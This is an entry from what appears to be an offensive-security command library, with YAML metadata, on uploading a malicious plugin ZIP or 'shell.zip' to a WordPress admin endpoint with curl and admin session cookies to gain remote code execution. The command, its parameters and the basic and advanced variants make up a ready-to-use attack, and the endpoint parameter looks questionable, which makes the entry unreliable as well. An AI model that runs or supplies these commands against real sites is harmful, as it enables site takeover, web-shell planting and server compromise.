---
id: c4g5h6i7-j8k9-0124-ghij-789012345678
data: >-
  curl -b admin_cookies.txt -X POST
  https://target.com/wp-admin/plugin-install.php?TabFunction=install -F
  "pluginzip=@malicious-plugin.zip" -H "Referer: https://target.com/wp-admin/"
tags:
  - wordpress
  - rce
  - upload
type: command
output: Plugin installed successfully.
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:48.289Z'
verified: false
validated: true
submitted: true
---
# wp-plugin-upload-rce

## Command

```bash
curl -b admin_cookies.txt -X POST https://target.com/wp-admin/plugin-install.php?TabFunction=install -F "pluginzip=@malicious-plugin.zip" -H "Referer: https://target.com/wp-admin/"
```

## Description

Uploads a malicious plugin ZIP to WordPress as admin, enabling RCE upon activation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b admin_cookies.txt` | Admin session cookies | Yes |
| `-X POST` | HTTP method | Yes |
| `-F` | Form file upload | Yes |
| `?TabFunction=install` | Install action | Yes |
| `-H Referer` | CSRF protection header | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt -X POST https://example.com/wp-admin/plugin-install.php?TabFunction=install -F "pluginzip=@shell.zip" -H "Referer: https://example.com/wp-admin/"
```

### Advanced Usage

```bash
curl -b cookies.txt -X POST https://example.com/wp-admin/plugin-install.php?TabFunction=install -F "pluginzip=@shell.zip" -F "install-button=Install Now" -H "Referer: https://example.com/wp-admin/"
```

## Expected Output

Confirmation of plugin installation.

## Related

- [[commands/wp-admin-login]]
- [[procedures/Execute-RCE-as-WordPress-Administrator]]
